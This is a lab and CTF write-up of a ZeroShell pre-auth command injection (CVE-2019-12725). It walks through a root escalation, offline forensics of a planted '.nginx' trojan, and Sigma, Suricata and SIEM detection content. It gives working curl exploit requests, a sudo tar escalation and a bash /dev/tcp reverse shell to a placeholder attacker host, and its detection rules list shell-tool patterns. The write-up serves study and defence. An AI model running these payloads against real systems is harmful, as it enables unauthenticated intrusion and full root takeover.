# Lab Writeup: ZeroShell `kerbynet` Pre-Auth Command Injection → root (CVE-2019-12725)

> **Environment**: Local Docker lab (minimal reproduction) + offline forensic image
> **Purpose**: Security research, blue-team detection engineering, forensic methodology
> **Status**: ✅ Complete
> **Date**: 2026-05-23

---

## Overview

ZeroShell ≤ 3.9.0 is an Italian-developed Linux-based router/firewall distribution. Its administrative web UI is implemented as a single CGI binary at `/cgi-bin/kerbynet`. Several action handlers under the `Section=NoAuthREQ` (no-auth) path concatenate user-supplied query parameters into shell command strings that are subsequently passed to `sudo openssl ...` via `system()` calls. Because the apache user (UID 1000) has `NOPASSWD` sudo on `openssl verify` (and other commands) with attacker-controllable arguments, **unauthenticated command injection trivially chains to root** through GTFOBins-style abuse.

This writeup documents the full kill chain observed in an enterprise pcap (CISCN / 长城杯 2024 forensic challenge):

- pre-auth RCE via `Action=x509view&Section=NoAuthREQ` + newline injection in `x509type`,
- privilege escalation via `sudo tar --checkpoint-action=exec=`,
- a pre-planted statically-linked ELF trojan masquerading as `.nginx`,
- AES-128 encrypted C2 with hardcoded weak key,
- persistence via the vendor-specific `/Database/var/register/system/startup/scripts/<svc>/File` mechanism.

| Item | Detail |
|------|--------|
| CVE | CVE-2019-12725 |
| CVSS | 9.8 (Critical) |
| Type | Unauthenticated OS Command Injection (CGI shell metachar) |
| Affected | ZeroShell ≤ 3.9.0 (project unmaintained — **no upstream patch**) |
| Default port | 80/tcp (HTTP), 443/tcp (HTTPS web UI) |
| Web user | `apache` (UID 1000) — has NOPASSWD sudo on multiple GTFOBins-able commands |
| Privesc | `sudo tar --checkpoint-action=exec=` (GTFOBins) |
| Vendor status | **No patch exists**; mitigation = decommission and replace |

---

## Attack Chain

```
Anonymous HTTP GET → /cgi-bin/kerbynet
  ?Action=x509view & Section=NoAuthREQ
  & x509type='%0A<arbitrary command>%0A'
        │
        ▼   shell injection in apache (uid 1000) context
   apache CGI executes:  sh -c "/etc/sudo openssl verify -CApath ... '<INJECTED>'"
        │
        ▼   pivot to root via GTFOBins
   /etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='<cmd>'
        │
        ▼
   <cmd> runs as root → full system compromise
        │
        ▼   (real-world engagement) attacker activates a pre-planted backdoor
   /Database/.nginx ──cp──> /tmp/.nginx ──exec──> AES-encrypted C2 beacon → 202.115.89.103:8080
   (persistence already established via /Database/var/register/system/startup/scripts/nat/File)
```

---

## Step-by-Step Reproduction

### 1. Environment Setup

```bash
# Option A — minimal vulnerable replica (this lab)
cd ~/Security/ctf-notes/labs/zeroshell_2019_12725/docker
docker compose up -d
# Replica exposes vulnerable CGI at http://127.0.0.1:8080/cgi-bin/kerbynet

# Option B — full ZeroShell ISO (heavy: ~700 MB, project archive)
# Grab zeroshell-3.9.0.iso from sourceforge, run in VMware,
# configure NAT subnet (default expects 61.139.2.0/24 in some CTF builds).
```

### 2. Fingerprinting

```bash
# Favicon hash (Shodan / FOFA-style)
curl -s http://target/favicon.ico | md5sum
# 21942d12fff9eba1d1c3e91dd3a4ff3a  →  ZeroShell 3.x

# Direct kerbynet probe (200 + form HTML if vulnerable)
curl -sI "http://target/cgi-bin/kerbynet?Action=Render&Object=sysinfo"

# Banner via response header
curl -sI http://target/ | grep -i ^Server
#   Server: Apache    (ZeroShell ships Apache on port 80)
```

### 3. Pre-Auth Command Injection — `id` probe

```bash
# Newline (%0A) + single-quote (%27) escape the wrapping shell quotes
curl -G \
  --data-urlencode "Action=x509view" \
  --data-urlencode "Section=NoAuthREQ" \
  --data-urlencode "User=" \
  --data-urlencode "x509type='$(printf '\n')id$(printf '\n')'" \
  http://target/cgi-bin/kerbynet
```

Raw HTTP for clarity:

```http
GET /cgi-bin/kerbynet?Action=x509view&Section=NoAuthREQ&User=&x509type='%0Aid%0A' HTTP/1.1
Host: target
User-Agent: curl/8.5.0
```

Expected response embeds:

```
uid=1000(apache) gid=1000(apache) groups=1000(apache)
```

### 4. Privilege Escalation — sudo `tar` GTFOBins

The web user (`apache`) is allowed to invoke `/etc/sudo openssl verify -CApath /etc/ssl/certs/trusted_CAs/ <attacker_string>` without a password. The wrapping shell expansion gives the attacker control of `<attacker_string>` — and from there, GNU tar's `--checkpoint-action=exec=<cmd>` runs `<cmd>` as root:

```bash
curl -G \
  --data-urlencode "Action=x509view" \
  --data-urlencode "Section=NoAuthREQ" \
  --data-urlencode "User=" \
  --data-urlencode "x509type='$(printf '\n')/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='id'$(printf '\n')'" \
  http://target/cgi-bin/kerbynet
```

The output shows:

```
uid=0(root) gid=0(root) groups=0(root)
```

### 5. Stable Reverse Shell

```bash
# Listener
nc -lvnp 4444

# Trigger
PAYLOAD="bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'"
curl -G \
  --data-urlencode "Action=x509view" \
  --data-urlencode "Section=NoAuthREQ" \
  --data-urlencode "User=" \
  --data-urlencode "x509type='$(printf '\n')/etc/sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec='$PAYLOAD'$(printf '\n')'" \
  http://target/cgi-bin/kerbynet
```

A root TTY drops on the listener.

### 6. Forensic Triage of a Compromised ZeroShell (Offline)

ZeroShell stores user data on a separate partition; the runtime mount is `/Database` ↔ the on-disk directory `_DB.001`. For DFIR / CTF replay you do **not** need to boot the appliance — mount the VMDK read-only:

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --read-only -c /dev/nbd0 zeroshell-000001.vmdk     # follows snapshot chain
sudo mount -o ro,norecovery /dev/nbd0p4 /mnt/zs                 # ext4 dirty → norecovery

# Indicator hunting
sudo find /mnt/zs/_DB.001 -type f -name ".*" -size +100k -executable
#   → /mnt/zs/_DB.001/.nginx                                    (816 KB, ELF i386, stripped)

# Persistence — vendor-specific autostart
sudo grep -r "\.nginx" /mnt/zs/_DB.001/var/register/system/startup/
#   → scripts/nat/File:  cp /Database/.nginx /tmp/.nginx ; chmod +x ; /tmp/.nginx

# Extract IOCs from the implant (see tools/extract_iocs.py in this lab)
python3 ../tools/extract_iocs.py /mnt/zs/_DB.001/.nginx
#   c2_ip = 202.115.89.103
#   aes_key = 11223344qweasdzxc
```

### 7. Trojan Reverse Engineering — Recover the AES Key

The implant is **statically linked**, **stripped**, **ELF 32-bit i386**, ~816 KB. Two telltale facts make key recovery trivial:

1. Configuration block placed in `.rodata` with **C2 IP and AES key adjacent** (offsets `0x9eaa3` and `0x9eab2` respectively).
2. The AES Te0 round table at `0x9e220` — its first byte sequence `A5 63 63 C6 84 7C 7C F8` confirms AES.

```bash
$ strings -t d .nginx | awk '$2 ~ /^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/{print; getline; print}'
649763 : 202.115.89.103
649778 : 11223344qweasdzxc       # 16-byte AES-128 key (keyboard walk)
```

The key (`11223344qweasdzxc`) is a textbook weak hand-crafted keyboard pattern (digits 1-4 + QWERTY rows). Once extracted, all subsequent C2 traffic can be decrypted offline.

---

## Defense

### Hardening / Mitigations

1. **Decommission ZeroShell.** Project is unmaintained — no patch exists for CVE-2019-12725. Migrate to OPNsense, pfSense, or VyOS.
2. **Remove apache from sudoers** for any GTFOBins-able command (`tar`, `find`, `vim`, `awk`, `less`, `openssl`). If business logic genuinely requires sudo, lock down the `Cmnd_Alias` to exact argument vectors.
3. **Sandbox the CGI process** under `nsjail`, `firejail`, or `systemd-nspawn` with `seccomp` syscall whitelist — even a successful injection cannot `execve("/bin/sh")`.
4. **Egress whitelist for edge devices.** Firewall appliances should never initiate outbound traffic on arbitrary high ports. Drop and alert on any outbound TCP from the firewall management interface that is not NTP/DNS/HTTPS to known update CDNs.
5. **File Integrity Monitoring** on `/Database/`, `/tmp/`, `/usr/local/apache2/`. Any hidden file (`.<name>`) creation in these directories must page on-call.
6. **Inbound IDS** with the Suricata rule below — even without a patch, blocking the `NoAuthREQ` + `%0A` URI pattern at the perimeter stops the attack.
7. **YARA periodic disk scan** for hardcoded weak symmetric keys (the `11223344qweasdzxc`-style keyboard walks are common across crimeware families).

### Detection — Narrative

- **Entry signature**: HTTP URI containing `kerbynet`, `Section=NoAuthREQ`, and any of `%0A` / `%27` / `%5C` / `tar%20` is a high-confidence pre-auth RCE attempt.
- **Privilege escalation signature**: kerbynet URI containing `tar` + `checkpoint-action` is a successful root escalation in progress.
- **Process anomaly**: `apache` user spawning `tar`/`openssl`/`sh` with arguments containing `--checkpoint` or `/dev/null /dev/null` is post-exploitation.
- **C2 beacon signature**: ZeroShell device initiating TCP/8080 connection to non-RFC1918 destinations with ~51 s periodicity is the implant phoning home.
- **Tradecraft signature**: User-Agent change between the same source IP within 10 minutes on the same `kerbynet` endpoint indicates recon→exploit pivot.

### Threat Hunting Checklist

**File layer**:
- `find / -type f -name ".*" -size +100k -executable 2>/dev/null` — surface all hidden large executables
- `find /tmp /var/tmp /dev/shm -type f -executable -mtime -30` — recent staging artifacts
- YARA rule scanning for `11223344qweasdzxc` and `202.115.89.103` string IOCs across all ELFs

**Process layer**:
- `ps -ef | grep -E "^\S+\s+\d+\s+\d+.*\s+\.\w"` — processes whose command line begins with a dot
- `ss -tunap | grep :8080` — current 8080 outbound sockets
- Auditd record of `apache` user `execve()` to `tar`, `openssl`, `sh`, `bash`

**Network layer**:
- 24-hour firewall log: same `dst_ip:dst_port` tuple appearing every 45-65 s from edge appliances
- Outbound traffic from edge appliance management plane to non-business networks
- DNS query history from firewall — any unexpected domain

**ZeroShell-specific**:
- Audit every `/Database/var/register/system/startup/scripts/*/File` — flag any reference to `/tmp/`, `/Database/.<name>`, or non-system binaries
- Hash-baseline all of `/Database/*` against a known-clean install
- Sudo log (`/var/log/secure`, `_DB.001/LOG/.../sudo`) for `apache` invoking GTFOBins commands

### SOC Artifacts

#### Sigma Rule

```yaml
title: ZeroShell kerbynet Unauthenticated Command Injection (CVE-2019-12725)
id: 5f9e7a14-3c2b-4d8e-b1a9-7e2c0d8f4a91
status: experimental
references:
  - https://nvd.nist.gov/vuln/detail/CVE-2019-12725
  - https://www.exploit-db.com/exploits/49096
author: colorfulwhitez
date: 2026-05-23
tags:
  - attack.initial_access
  - attack.t1190
  - attack.execution
  - attack.t1059.004
  - attack.privilege_escalation
  - attack.t1548.003
  - cve.2019.12725
logsource:
  category: webserver
detection:
  selection_uri:
    cs-uri-stem|contains: '/cgi-bin/kerbynet'
  selection_no_auth:
    cs-uri-query|contains: 'Section=NoAuthREQ'
  selection_injection:
    cs-uri-query|contains:
      - '%0A'
      - '%27%0A'
      - 'tar%20'
      - 'checkpoint-action'
      - 'bash%20-i'
      - 'nc%20-e'
  condition: selection_uri and selection_no_auth and selection_injection
falsepositives:
  - Legitimate admin sessions never use NoAuthREQ — always carry STk token
level: critical
```

#### Suricata Rule

```
alert http any any -> $HOME_NET any (msg:"ET WEB_SPECIFIC ZeroShell kerbynet NoAuthREQ RCE Attempt (CVE-2019-12725)";
    flow:established,to_server;
    http.method; content:"GET";
    http.uri; content:"/cgi-bin/kerbynet"; nocase;
    http.uri; content:"Section=NoAuthREQ"; nocase;
    http.uri; pcre:"/(x509type|User)=[^&]*(%0A|%27|'|%5C)/i";
    classtype:web-application-attack;
    reference:cve,2019-12725;
    reference:url,exploit-db.com/exploits/49096;
    sid:2019012725; rev:1;)

alert http any any -> $HOME_NET any (msg:"ET WEB_SPECIFIC ZeroShell sudo tar checkpoint-action GTFOBins Privilege Escalation";
    flow:established,to_server;
    http.uri; content:"kerbynet"; nocase;
    http.uri; content:"tar"; nocase;
    http.uri; pcre:"/(checkpoint[-=]action|--checkpoint=)/i";
    classtype:successful-admin;
    reference:cve,2019-12725;
    reference:url,gtfobins.github.io/gtfobins/tar/;
    sid:2019012726; rev:1;)

alert tcp $HOME_NET any -> $EXTERNAL_NET 8080 (msg:"MALWARE Suspicious Periodic SYN Beacon ~51s from Network Device";
    flow:to_server; flags:S,12;
    detection_filter:track by_src, count 5, seconds 300;
    classtype:trojan-activity;
    reference:cve,2019-12725;
    sid:2019012728; rev:1;)
```

#### Structured IOCs

| Type | Indicator | Confidence | Notes |
|---|---|---|---|
| IPv4 | `182.143.237.15` | High | Observed attacker source (NoAuthREQ RCE) |
| IPv4 | `202.115.89.103` | High | Hardcoded C2 in `.nginx` (TCP/8080) |
| IPv4 | `94.177.163.149` | Medium | Secondary callout (TCP/80) — backup C2 candidate |
| Filename | `.nginx` | High | Hidden ELF masquerading as nginx |
| Path | `/Database/.nginx` | High | Persistent on-disk implant location |
| Path | `/tmp/.nginx` | High | Runtime execution location post-boot |
| Path | `/Database/var/register/system/startup/scripts/nat/File` | High | Persistence — fake NAT startup hook |
| MD5 | `9db26e8207116dea1e2cdf4358d50408` | High | `.nginx` MD5 |
| SHA-256 | `0762bae4eef0865889c2daf11ebcc76ec476b2274429aee8e4c24237035007fe` | High | `.nginx` SHA-256 |
| Crypto key | `11223344qweasdzxc` | High | AES-128 symmetric key (hardcoded, weak) |
| URL pattern | `/cgi-bin/kerbynet?*Section=NoAuthREQ*` | High | Pre-auth entry path |
| URL pattern | `*x509type=*tar*checkpoint-action*` | High | sudo `tar` GTFOBins privesc |
| Behavior | TCP SYN every ~51 s to fixed `*:8080` | High | Implant heartbeat |
| MITRE | T1190 / T1548.003 / T1059.004 / T1547 / T1036.005 / T1071.001 / T1573.001 | — | Full coverage |

#### SIEM Hunting Queries

**Splunk SPL** — pre-auth RCE entry detection:

```spl
index=web (sourcetype="apache:access" OR sourcetype="access_combined")
    uri="*kerbynet*" uri="*Section=NoAuthREQ*"
    (uri="*%0A*" OR uri="*%27*" OR uri="*x509type=*")
| eval decoded_uri = urldecode(uri)
| eval risk = case(
    match(decoded_uri, "checkpoint-action"), 95,
    match(decoded_uri, "(?i)(bash|sh|nc|wget|curl)"), 90,
    match(decoded_uri, "(?i)(id|whoami|uname)"), 70,
    1=1, 50)
| stats count values(useragent) as ua earliest(_time) as first
        latest(_time) as last max(risk) as max_risk
    by clientip
| where max_risk >= 50 | sort -max_risk
```

**Splunk SPL** — periodic-beacon heuristic (~51 s cadence):

```spl
index=netflow dest_port=8080
| stats count earliest(_time) as first latest(_time) as last by src_ip, dest_ip
| where count >= 5
| eval interval = (last - first) / (count - 1)
| where interval > 40 AND interval < 70
| eval verdict = if(interval > 45 AND interval < 55, "BEACON_HIGH", "BEACON_MEDIUM")
| table src_ip dest_ip count first last interval verdict
```

**Microsoft Sentinel KQL** — multi-IOC unified hunt:

```kql
let IocIPs = dynamic(["182.143.237.15","202.115.89.103","94.177.163.149"]);
let IocHashes = dynamic([
    "9db26e8207116dea1e2cdf4358d50408",
    "0762bae4eef0865889c2daf11ebcc76ec476b2274429aee8e4c24237035007fe"]);
union isfuzzy=true
  (CommonSecurityLog
     | where SourceIP in (IocIPs) or DestinationIP in (IocIPs)
     | project TimeGenerated, EventType="Network", SourceIP, DestinationIP, DestinationPort),
  (DeviceFileEvents
     | where MD5 in (IocHashes) or SHA256 in (IocHashes)
     | project TimeGenerated, EventType="File", DeviceName, FileName, MD5, SHA256)
| order by TimeGenerated desc
```

**Microsoft Sentinel KQL** — automatic periodicity detection:

```kql
let TimeWindow = 2h;
CommonSecurityLog
| where TimeGenerated > ago(TimeWindow)
| where DestinationPort == 8080
| where not(ipv4_is_private(DestinationIP))
| make-series Counts = count() default = 0
    on TimeGenerated from ago(TimeWindow) to now() step 5s
    by SourceIP, DestinationIP
| extend (Periods, Scores) = series_periods_detect(Counts, 30s, 120s, 3)
| mv-expand Periods to typeof(real), Scores to typeof(real)
| extend PeriodSec = Periods * 5.0
| where PeriodSec between (40.0 .. 65.0) and Scores > 0.7
| project SourceIP, DestinationIP, PeriodSec, Scores
```

---

## Tools & References

### Local Tools Included

- `docker/Dockerfile` — minimal vulnerable kerbynet replica
- `docker/docker-compose.yml` — one-shot lab boot
- `docker/kerbynet.cgi` — Bash CGI that reproduces the injection sink
- `tools/extract_iocs.py` — generic ELF IOC extractor (C2 IP + adjacent symmetric key heuristic + AES table fingerprint)
- `tools/exploit.py` — full attack chain (probe → privesc → reverse shell)

### External References

- [NVD: CVE-2019-12725](https://nvd.nist.gov/vuln/detail/CVE-2019-12725)
- [Exploit-DB 49096 — ZeroShell 3.9.0 Unauthenticated RCE](https://www.exploit-db.com/exploits/49096)
- [GTFOBins: tar](https://gtfobins.github.io/gtfobins/tar/)
- [ZeroShell project page (archived)](http://www.zeroshell.net/)
- MITRE ATT&CK: [T1190](https://attack.mitre.org/techniques/T1190/), [T1548.003](https://attack.mitre.org/techniques/T1548/003/), [T1547](https://attack.mitre.org/techniques/T1547/), [T1071.001](https://attack.mitre.org/techniques/T1071/001/), [T1573.001](https://attack.mitre.org/techniques/T1573/001/)

---

## Disclaimer

This writeup documents authorized security research conducted in an isolated local Docker environment and on forensic disk images legally provided by a CTF (CISCN/长城杯 2024). No production systems were targeted. The purpose is educational — understanding the attack technique to build better defenses.
